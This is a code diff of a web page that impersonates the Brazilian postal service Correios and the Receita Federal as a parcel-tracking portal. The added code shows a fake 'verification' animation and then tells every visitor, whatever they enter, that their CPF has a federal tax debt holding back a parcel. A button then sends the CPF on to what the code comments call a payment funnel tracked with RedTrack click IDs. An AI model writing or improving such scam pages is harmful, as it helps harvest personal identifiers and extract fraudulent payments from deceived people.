@@ -7,7 +7,6 @@
     <meta name="description" content="Rastreamento de Encomendas - Correios">
     <title>Rastreamento de Encomendas - Correios</title>
 
-    <!-- rtkcid: entrada oficial do funil — semeia o click ID do RedTrack -->
     <script>(function(){try{var r=new URLSearchParams(location.search).get('rtkcid');if(r&&/^[0-9a-fA-F]{24}$/.test(r))sessionStorage.setItem('_rtk',r);}catch(e){}})();</script>
 
     <link rel="icon" type="image/webp" href="assets/images/favicon.webp">
@@ -15,13 +14,17 @@
 
     <style>
       *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-      body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#eef1f4;color:#15324a;line-height:1.5;min-height:100vh}
+      body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#eef1f4;color:#15324a;line-height:1.5;min-height:100vh;display:flex;flex-direction:column}
       img{max-width:100%;height:auto;display:block}
+
+      /* Header */
       .cor-top{background:#f1f1f1;padding:13px 16px;display:flex;justify-content:center;border-bottom:1px solid #e3e3e3}
       .cor-top img{height:32px;width:auto}
       .ssl-bar{background:linear-gradient(100deg,#ffd400 70%,#ffe25a);color:#0b3a63;text-align:center;font-weight:600;font-size:13px;padding:9px 12px;display:flex;align-items:center;justify-content:center;gap:7px}
       .ssl-bar .chk{color:#0b7a3b;font-weight:800}
-      .portal-wrap{max-width:560px;margin:0 auto;padding:18px 16px 30px}
+
+      /* Body */
+      .portal-wrap{flex:1;max-width:560px;margin:0 auto;padding:18px 16px 24px;width:100%}
       .rf-card{background:linear-gradient(135deg,#1c3c61,#142d49);border-radius:12px;padding:15px 18px;display:flex;align-items:center;justify-content:space-between;gap:12px;box-shadow:0 5px 18px rgba(15,41,66,.20)}
       .rf-logo{height:28px;width:auto;filter:brightness(0) invert(1)}
       .rf-right{text-align:right;color:#fff;line-height:1.35}
@@ -30,23 +33,72 @@
       .rf-right .dot{color:#39d98a;font-size:10px}
       .portal-h1{text-align:center;color:#1b3a5e;font-size:26px;font-weight:800;margin:22px 0 3px;line-height:1.2}
       .portal-sub{text-align:center;color:#5f7d99;font-size:15px;margin:0 0 20px}
+
+      /* Card */
       .consult-card{background:#fff;border-radius:14px;box-shadow:0 6px 22px rgba(15,41,66,.09);border:1px solid #e8edf2;padding:20px 18px}
       .aviso{background:#fdeceb;border-left:4px solid #d8392f;border-radius:8px;padding:13px 13px 13px 12px;display:flex;gap:10px;margin-bottom:15px}
       .aviso .ico{flex:0 0 auto;width:22px;height:22px;border-radius:50%;background:#d8392f;color:#fff;font-size:13px;font-weight:700;font-style:italic;display:flex;align-items:center;justify-content:center}
       .aviso b{color:#c0291f;font-size:14px;display:block;margin-bottom:3px}
       .aviso p{color:#c0392b;font-size:13.5px;line-height:1.45;margin:0}
-      .consult-text{text-align:center;color:#2c5878;font-size:15px;line-height:1.5;margin:4px 2px 15px}
-      .consult-input{width:100%;padding:13px 14px;font-size:16px;border:2px solid #cfdbe5;border-radius:9px;color:#15324a;text-transform:uppercase;margin-bottom:12px}
+      .consult-label{color:#2c5878;font-size:14px;font-weight:600;margin-bottom:8px;display:block}
+
+      /* Input com checkmark */
+      .input-wrap{position:relative;margin-bottom:12px}
+      .consult-input{width:100%;padding:13px 42px 13px 14px;font-size:16px;border:2px solid #cfdbe5;border-radius:9px;color:#15324a;text-transform:uppercase;transition:border-color .2s}
       .consult-input:focus{outline:none;border-color:#1b3a5e}
       .consult-input::placeholder{text-transform:none;color:#9fb1bf}
+      .consult-input.valid{border-color:#2e9e5b}
+      .inp-chk{position:absolute;right:12px;top:50%;transform:translateY(-50%);width:24px;height:24px;border-radius:50%;background:#2e9e5b;color:#fff;font-size:13px;font-weight:700;display:none;align-items:center;justify-content:center;pointer-events:none}
+      .consult-input.valid ~ .inp-chk{display:flex}
+
       .consult-btn{width:100%;padding:16px;border:0;border-radius:9px;background:linear-gradient(135deg,#1c3c61,#0e2740);color:#fff;font-size:15.5px;font-weight:700;letter-spacing:.4px;display:flex;align-items:center;justify-content:center;gap:9px;cursor:pointer;box-shadow:0 4px 14px rgba(15,41,66,.25)}
       .consult-btn:active{transform:translateY(1px)}
       .consult-err{color:#c0291f;font-size:13.5px;font-weight:600;margin-top:10px;display:none}
+
+      /* Info cards */
       .info-cards{display:flex;gap:9px;margin-top:18px}
       .info-card{flex:1;background:#fff;border-radius:12px;border:1px solid #eaeef2;border-top:4px solid var(--ac);padding:14px 7px;text-align:center;box-shadow:0 2px 8px rgba(15,41,66,.05)}
       .info-card .ic{width:38px;height:38px;border-radius:50%;background:var(--bg);display:flex;align-items:center;justify-content:center;margin:0 auto 8px;font-size:16px}
       .info-card h4{color:#1b3a5e;font-size:13px;font-weight:700;margin:0 0 5px}
       .info-card p{color:#6a8197;font-size:11px;line-height:1.4;margin:0}
+
+      /* Footer */
+      .site-footer{background:#fdd306;padding:18px 16px;text-align:center;margin-top:auto}
+      .site-footer img{height:70px;width:auto;margin:0 auto 8px}
+      .site-footer p{font-size:11px;color:#014268}
+
+      /* ── MODAL ── */
+      .modal-ov{position:fixed;inset:0;background:rgba(0,0,0,.60);display:flex;align-items:center;justify-content:center;z-index:999;padding:20px}
+      .modal-ov[hidden]{display:none}
+      .modal-box{background:#fff;border-radius:18px;padding:28px 20px 22px;max-width:340px;width:100%;box-shadow:0 24px 70px rgba(0,0,0,.30)}
+
+      /* State 1 — Verificando */
+      #mLoad{text-align:center}
+      .m-rflogo{height:38px;width:auto;margin:0 auto 22px}
+      .m-spinner{width:46px;height:46px;border:3.5px solid #e2e8f0;border-top-color:#1c3c61;border-radius:50%;animation:spin .85s linear infinite;margin:0 auto 18px}
+      @keyframes spin{to{transform:rotate(360deg)}}
+      .m-checking{color:#3a5570;font-size:13.5px;margin-bottom:20px}
+      .m-bar-wrap{height:7px;background:#e8ecf0;border-radius:4px;overflow:hidden}
+      .m-bar{height:100%;background:#1c3c61;border-radius:4px;width:0;transition:none}
+
+      /* State 2 — Resultado */
+      #mResult{display:none}
+      .mr-logo{height:32px;width:auto;margin:0 auto 14px}
+      .mr-title{text-align:center;color:#1b3a5e;font-size:17px;font-weight:800;margin-bottom:4px}
+      .mr-val{text-align:center;color:#2c5878;font-size:15.5px;font-weight:700;margin-bottom:16px;letter-spacing:.5px}
+      .mr-info{background:#eaf3fb;border:1px solid #b8d6ef;border-radius:9px;padding:12px 13px;margin-bottom:10px;display:flex;gap:9px;align-items:flex-start}
+      .mr-info .bi{flex:0 0 20px;height:20px;background:#1976b8;color:#fff;border-radius:50%;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;margin-top:1px}
+      .mr-info b{color:#1558a0;font-size:12px;display:block;margin-bottom:3px;text-transform:uppercase;letter-spacing:.3px}
+      .mr-info p{color:#2c5878;font-size:11.5px;line-height:1.5;margin:0}
+      .mr-pend{background:#fff1f0;border:1px solid #f5c2c2;border-radius:9px;padding:12px 13px;margin-bottom:16px;display:flex;gap:9px;align-items:flex-start}
+      .mr-pend .bp{flex:0 0 20px;height:20px;background:#c0291f;color:#fff;border-radius:50%;font-size:14px;font-weight:700;display:flex;align-items:center;justify-content:center;margin-top:1px}
+      .mr-pend b{color:#a51c14;font-size:12px;display:block;margin-bottom:6px;text-transform:uppercase;letter-spacing:.3px}
+      .mr-pend ul{padding-left:14px;margin:0}
+      .mr-pend li{color:#c0291f;font-size:11.5px;line-height:1.55;margin-bottom:3px}
+      .mr-cta{width:100%;padding:15px;border:0;border-radius:10px;background:linear-gradient(135deg,#1e9e50,#167a3d);color:#fff;font-size:14px;font-weight:700;letter-spacing:.4px;cursor:pointer;margin-bottom:13px;box-shadow:0 4px 14px rgba(22,122,61,.30)}
+      .mr-cta:active{transform:translateY(1px)}
+      .mr-seals{display:flex;flex-direction:column;gap:5px;align-items:center}
+      .mr-seals span{color:#7a95a8;font-size:11.5px}
     </style>
 </head>
 <body>
@@ -70,8 +122,11 @@
                     <p>Verifique se há pendências fiscais vinculadas ao seu CPF que possam impactar a liberação de suas encomendas.</p>
                 </div>
             </div>
-            <p class="consult-text">Para consultar suas encomendas e verificar pendências fiscais, informe seu CPF ou o código de rastreamento abaixo.</p>
-            <input class="consult-input" id="consulta" type="text" placeholder="CPF ou código (ex.: AA123456789BR)" maxlength="20" autocapitalize="characters" autocomplete="off">
+            <label class="consult-label" for="consulta">Digite seu CPF ou código de rastreamento:</label>
+            <div class="input-wrap">
+                <input class="consult-input" id="consulta" type="text" placeholder="CPF ou código (ex.: AA123456789BR)" maxlength="20" autocapitalize="characters" autocomplete="off">
+                <div class="inp-chk">✓</div>
+            </div>
             <button class="consult-btn" id="btn-consultar" type="button">🔍 CONSULTAR ENCOMENDAS AGORA</button>
             <div class="consult-err" id="erro"></div>
         </div>
@@ -83,60 +138,155 @@
         </div>
     </div>
 
+    <footer class="site-footer">
+        <img src="assets/images/logo-rodape.webp" alt="Correios e Governo do Brasil">
+        <p>© 2026 Correios — Portal de Rastreamento</p>
+    </footer>
+
+    <!-- MODAL OVERLAY -->
+    <div class="modal-ov" id="modal" hidden>
+      <div class="modal-box">
+
+        <!-- State 1: Verificando -->
+        <div id="mLoad">
+          <img class="m-rflogo" src="assets/images/receita-federal.webp" alt="Receita Federal">
+          <div class="m-spinner"></div>
+          <p class="m-checking">Verificando base de dados da Receita Federal...</p>
+          <div class="m-bar-wrap"><div class="m-bar" id="mBar"></div></div>
+        </div>
+
+        <!-- State 2: Resultado -->
+        <div id="mResult">
+          <img class="mr-logo" src="assets/images/receita-federal.webp" alt="Receita Federal">
+          <p class="mr-title" id="mTitle">CPF Localizado no Sistema</p>
+          <p class="mr-val" id="mVal"></p>
+          <div class="mr-info">
+            <div class="bi">i</div>
+            <div>
+              <b>Sistema da Receita Federal</b>
+              <p>CPF localizado na base de dados. Dados adicionais podem não estar disponíveis devido às configurações de privacidade. Prossiga com a consulta.</p>
+            </div>
+          </div>
+          <div class="mr-pend">
+            <div class="bp">!</div>
+            <div>
+              <b>Pendência Fiscal Identificada</b>
+              <ul>
+                <li>Objeto retido aguardando regularização tributária.</li>
+                <li>Motivo: Pendência de tributos federais vinculados ao CPF.</li>
+                <li>Ação necessária: Verificar detalhes para prosseguir com a entrega.</li>
+              </ul>
+            </div>
+          </div>
+          <button class="mr-cta" id="mBtn">VER DETALHES E REGULARIZAR</button>
+          <div class="mr-seals">
+            <span>ⓘ Sistema oficial de regularização</span>
+            <span>ⓘ Consulta disponível 24 horas</span>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
     <script>
     (function(){
-        var btn = document.getElementById('btn-consultar');
-        var inp = document.getElementById('consulta');
-        var erro = document.getElementById('erro');
+        var btn    = document.getElementById('btn-consultar');
+        var inp    = document.getElementById('consulta');
+        var erro   = document.getElementById('erro');
+        var modal  = document.getElementById('modal');
+        var mBar   = document.getElementById('mBar');
+        var mLoad  = document.getElementById('mLoad');
+        var mResult= document.getElementById('mResult');
+        var mTitle = document.getElementById('mTitle');
+        var mVal   = document.getElementById('mVal');
+        var mBtn   = document.getElementById('mBtn');
+        var destUrl = '';
 
         function showErr(msg){ erro.textContent = msg; erro.style.display = 'block'; inp.focus(); }
 
-        // Checksum oficial de CPF (mesmo critério do validarCPF do funil/pagamento)
+        function fmtCpf(d){ return d.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4'); }
+
         function validarCPF(cpf){
-            cpf = (cpf || '').replace(/\D/g, '');
-            if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
-            var soma = 0, i, dig;
-            for (i = 0; i < 9; i++) soma += parseInt(cpf.charAt(i), 10) * (10 - i);
-            dig = 11 - (soma % 11); if (dig >= 10) dig = 0;
-            if (dig !== parseInt(cpf.charAt(9), 10)) return false;
-            soma = 0;
-            for (i = 0; i < 10; i++) soma += parseInt(cpf.charAt(i), 10) * (11 - i);
-            dig = 11 - (soma % 11); if (dig >= 10) dig = 0;
-            return dig === parseInt(cpf.charAt(10), 10);
+            cpf = (cpf || '').replace(/\D/g,'');
+            if(cpf.length!==11||/^(\d)\1{10}$/.test(cpf))return false;
+            var s=0,i,d;
+            for(i=0;i<9;i++)s+=parseInt(cpf[i])*(10-i);
+            d=11-(s%11);if(d>=10)d=0;
+            if(d!==parseInt(cpf[9]))return false;
+            s=0;
+            for(i=0;i<10;i++)s+=parseInt(cpf[i])*(11-i);
+            d=11-(s%11);if(d>=10)d=0;
+            return d===parseInt(cpf[10]);
         }
 
+        function checkValid(){
+            var raw=(inp.value||'').trim();
+            var ok=false;
+            if(!/[a-zA-Z]/.test(raw)){
+                var dig=raw.replace(/\D/g,'');
+                if(dig.length>=11)ok=validarCPF(dig);
+            } else {
+                var code=raw.toUpperCase().replace(/[^A-Z0-9]/g,'');
+                ok=/^[A-Z]{2}[0-9]{9}[A-Z]{2}$/.test(code);
+            }
+            inp.classList.toggle('valid',ok);
+        }
+        inp.addEventListener('input',function(){ erro.style.display='none'; checkValid(); });
+
         function consultar(){
-            erro.style.display = 'none';
-            var raw = (inp.value || '').trim();
-            if (!raw) { showErr('Informe seu CPF ou código de rastreamento.'); return; }
+            erro.style.display='none';
+            var raw=(inp.value||'').trim();
+            if(!raw){showErr('Informe seu CPF ou código de rastreamento.');return;}
+            var temLetra=/[a-zA-Z]/.test(raw);
+            var digitos=raw.replace(/\D/g,'');
+            var params=new URLSearchParams(location.search);
 
-            var temLetra = /[a-zA-Z]/.test(raw);
-            var digitos  = raw.replace(/\D/g, '');
-            var params   = new URLSearchParams(location.search);  // preserva rtkcid + demais
-
-            // CPF: só números (com ou sem máscara), 11 dígitos
-            if (!temLetra && digitos.length >= 11) {
-                var cpf = digitos.slice(0, 11);
-                if (!validarCPF(cpf)) { showErr('CPF inválido. Confira os números e tente novamente.'); return; }
-                params.set('tipo', 'cpf');
-                params.set('cpf', cpf);
-                window.location.href = '/index.html?' + params.toString();
+            if(!temLetra&&digitos.length>=11){
+                var cpf=digitos.slice(0,11);
+                if(!validarCPF(cpf)){showErr('CPF inválido. Confira os números e tente novamente.');return;}
+                params.set('tipo','cpf');
+                params.set('cpf',cpf);
+                mTitle.textContent='CPF Localizado no Sistema';
+                mVal.textContent=fmtCpf(cpf);
+                destUrl='/index.html?'+params.toString();
+                openModal();
                 return;
             }
 
-            // Código de rastreamento: formato Correios AA999999999BR
-            var code = raw.toUpperCase().replace(/[^A-Z0-9]/g, '');
-            if (!/^[A-Z]{2}[0-9]{9}[A-Z]{2}$/.test(code)) {
+            var code=raw.toUpperCase().replace(/[^A-Z0-9]/g,'');
+            if(!/^[A-Z]{2}[0-9]{9}[A-Z]{2}$/.test(code)){
                 showErr('Use o formato AA123456789BR (2 letras, 9 números, 2 letras) — ou informe o CPF.');
                 return;
             }
-            params.set('tipo', 'rastreio');
-            params.set('rastreio', code);
-            window.location.href = '/index.html?' + params.toString();
+            params.set('tipo','rastreio');
+            params.set('rastreio',code);
+            mTitle.textContent='Código Localizado no Sistema';
+            mVal.textContent=code;
+            destUrl='/index.html?'+params.toString();
+            openModal();
         }
 
-        btn.addEventListener('click', consultar);
-        inp.addEventListener('keydown', function(e){ if (e.key === 'Enter') { e.preventDefault(); consultar(); } });
+        function openModal(){
+            mLoad.style.display='block';
+            mResult.style.display='none';
+            mBar.style.transition='none';
+            mBar.style.width='0%';
+            modal.removeAttribute('hidden');
+            requestAnimationFrame(function(){
+                requestAnimationFrame(function(){
+                    mBar.style.transition='width 3.5s linear';
+                    mBar.style.width='100%';
+                });
+            });
+            setTimeout(function(){
+                mLoad.style.display='none';
+                mResult.style.display='block';
+            },3500);
+        }
+
+        mBtn.addEventListener('click',function(){ window.location.href=destUrl; });
+        btn.addEventListener('click',consultar);
+        inp.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();consultar();}});
     })();
     </script>
 </body>
